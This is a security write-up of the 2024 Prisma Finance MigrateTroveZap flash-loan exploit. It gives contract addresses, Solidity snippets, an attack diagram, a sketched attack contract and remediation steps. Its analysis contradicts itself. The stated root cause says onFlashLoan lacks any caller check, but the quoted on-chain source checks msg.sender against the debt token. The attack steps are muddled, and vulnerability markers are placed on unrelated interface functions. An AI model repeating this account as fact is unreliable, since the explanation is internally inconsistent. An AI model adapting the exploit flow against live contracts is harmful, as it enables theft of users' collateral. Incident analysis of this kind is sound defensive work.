# Prisma Finance — MigrateTroveZap Flash Loan Trove Hijacking Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | Prisma Finance |
| **Chain** | Ethereum |
| **Loss** | ~$11,000,000 |
| **Attacker** | [0x7e39e3b3](https://etherscan.io/address/0x7e39e3b3ff7adef2613d5cc49558eab74b9a4202) |
| **Attack Contract** | [0xd996073019c7](https://etherscan.io/address/0xd996073019c74b2fb94ead236e32032405bc027c) |
| **Vulnerable Contract** | [MigrateTroveZap 0xcc721810](https://etherscan.io/address/0xcc7218100da61441905e0c327749972e3cbee9ee) |
| **BorrowerOperations** | [0x72c590349](https://etherscan.io/address/0x72c590349535AD52e6953744cb2A36B409542719) |
| **mkUSD Token** | [0x4591DBfF](https://etherscan.io/address/0x4591DBfF62656E7859Afe5e45f6f47D3669fBB28) |
| **wstETH** | [0x7f39C581](https://etherscan.io/address/0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) |
| **Balancer Vault** | [0xBA122222](https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) |
| **Root Cause** | `MigrateTroveZap.onFlashLoan()` callback does not validate the caller (msg.sender), allowing arbitrary triggering of `setDelegateApproval()` to hijack Trove collateral |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Prisma_exp.sol) |

---

## 1. Vulnerability Overview

Prisma Finance's `MigrateTroveZap` contract is a helper that supports Trove migration. The `onFlashLoan()` callback can be called by anyone without caller validation. An attacker used an mkUSD flash loan to call `setDelegateApproval()` within the callback, setting MigrateTroveZap as a delegate, then drained wstETH collateral by opening and immediately closing a Trove.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: onFlashLoan caller not validated
interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data  // ← arbitrary parameter injection possible
    ) external returns (bytes32);
}

// MigrateTroveZap.onFlashLoan():
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
) external returns (bytes32) {
    // No validation that msg.sender is a trusted flash loan provider
    // No validation that initiator is the actual requester
    (address troveManager, address collateral, ...) = abi.decode(data, (...));
    // ← attacker injects arbitrary parameters via data
    borrowerOps.openTrove(...);
    borrowerOps.closeTrove(...);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

// ✅ Safe code: validate caller and initiator
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
) external returns (bytes32) {
    require(msg.sender == address(mkUSDLender), "invalid lender");
    require(initiator == address(this), "invalid initiator");
    // ...
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: MigrateTroveZap.sol
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == address(debtToken), "!DebtToken");
        (
            address account,
            address troveManagerFrom,
            address troveManagerTo,
            uint256 maxFeePercentage,
            uint256 coll,
            address upperHint,
            address lowerHint
        ) = abi.decode(data, (address, address, address, uint256, uint256, address, address));
        uint256 toMint = amount + fee;
        borrowerOps.closeTrove(troveManagerFrom, account);  // ❌ vulnerability
        borrowerOps.openTrove(troveManagerTo, account, maxFeePercentage, coll, toMint, upperHint, lowerHint);
        return _RETURN_VALUE;
    }
```

```solidity
// File: IBorrowerOperations.sol
    function setDelegateApproval(address _delegate, bool _isApproved) external;  // ❌ vulnerability

    function setMinNetDebt(uint256 _minNetDebt) external;

    function withdrawColl(
        address troveManager,
        address account,
        uint256 _collWithdrawal,
        address _upperHint,
        address _lowerHint
    ) external;

    function withdrawDebt(
        address troveManager,
        address account,
        uint256 _maxFeePercentage,
        uint256 _debtAmount,
        address _upperHint,
        address _lowerHint
    ) external;

    function checkRecoveryMode(uint256 TCR) external pure returns (bool);

    function CCR() external view returns (uint256);

    function DEBT_GAS_COMPENSATION() external view returns (uint256);

    function DECIMAL_PRECISION() external view returns (uint256);

    function PERCENT_DIVISOR() external view returns (uint256);

    function PRISMA_CORE() external view returns (address);

    function _100pct() external view returns (uint256);

    function debtToken() external view returns (address);

    function factory() external view returns (address);

    function getCompositeDebt(uint256 _debt) external view returns (uint256);

```

```solidity
// File: IDebtToken.sol
    function enableTroveManager(address _troveManager) external;  // ❌ vulnerability

    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);

    function forceResumeReceive(uint16 _srcChainId, bytes calldata _srcAddress) external;

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

    function lzReceive(uint16 _srcChainId, bytes calldata _srcAddress, uint64 _nonce, bytes calldata _payload) external;

    function mint(address _account, uint256 _amount) external;

    function mintWithGasCompensation(address _account, uint256 _amount) external returns (bool);

    function nonblockingLzReceive(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) external;

    function permit(
        address owner,
        address spender,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function renounceOwnership() external;

    function returnFromPool(address _poolAddress, address _receiver, uint256 _amount) external;

    function sendToSP(address _sender, uint256 _amount) external;

    function setConfig(uint16 _version, uint16 _chainId, uint256 _configType, bytes calldata _config) external;

    function setMinDstGas(uint16 _dstChainId, uint16 _packetType, uint256 _minGas) external;

```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Call MigrateTroveZap.onFlashLoan() directly (mkUSD)
  │         └─ No caller validation
  │
  ├─→ [2] Flash loan wstETH from Balancer
  │
  ├─→ [3] receiveFlashLoan():
  │         └─ BorrowerOps.setDelegateApproval(MigrateTroveZap, true)
  │
  ├─→ [4] Second mkUSD flash loan
  │         └─ onFlashLoan(): openTrove(wstETH collateral)
  │
  ├─→ [5] closeTrove() — withdraw wstETH collateral (to attacker address)
  │
  ├─→ [6] Repay all flash loans
  │
  └─→ [7] ~$11M wstETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IMKUSDLoan {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

interface IBorrowerOperations {
    function setDelegateApproval(address delegate, bool isApproved) external;
    function openTrove(address troveManager, address account, uint256 maxFeePercentage, uint256 collateralAmount, uint256 debtAmount, address upperHint, address lowerHint) external;
    function closeTrove(address troveManager, address account) external;
}

contract AttackContract {
    IMKUSDLoan         constant mkUSDLoan  = IMKUSDLoan(address(0)/* mkUSD flash lender */);
    IBorrowerOperations constant borrowerOps = IBorrowerOperations(0x72c590349535AD52e6953744cb2A36B409542719);
    address            constant zapContract = 0xcc7218100da61441905e0c327749972e3cbee9ee;

    function testExploit() external {
        // [1] Flash loan wstETH from Balancer
        balancer.flashLoan(address(this), wstETH, amount, "");
    }

    function receiveFlashLoan(...) external {
        // [2] Set MigrateTroveZap as delegate
        borrowerOps.setDelegateApproval(zapContract, true);

        // [3] Execute onFlashLoan via mkUSD flash loan
        bytes memory data = encodeExploitData(wstETH, borrowAmount);
        mkUSDLoan.flashLoan(zapContract, mkUSD, borrowAmount, data);

        // [4] Repay flash loan
        IERC20(wstETH).transfer(address(balancer), flashAmount);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan callback caller not validated |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (direct onFlashLoan call + delegate approval) |
| **DApp Category** | CDP-based stablecoin protocol |
| **Impact** | Trove collateral hijacking (~$11M) |

## 6. Remediation Recommendations

1. **Validate onFlashLoan caller**: Verify that `msg.sender` is a trusted flash loan provider
2. **Validate initiator**: Verify that `initiator` is MigrateTroveZap itself
3. **Restrict delegate approval scope**: Minimize delegate permissions granted via `setDelegateApproval`
4. **Lock Trove migration**: Prevent external calls during an ongoing migration

## 7. Lessons Learned

- The ERC3156 `onFlashLoan()` callback must always verify that the caller is a trusted flash loan provider.
- Granting broad permissions to a helper contract via `setDelegateApproval()` means any vulnerability in that contract is immediately exploitable.
- Helper and migration contracts in CDP protocols require the same level of security auditing as the core protocol.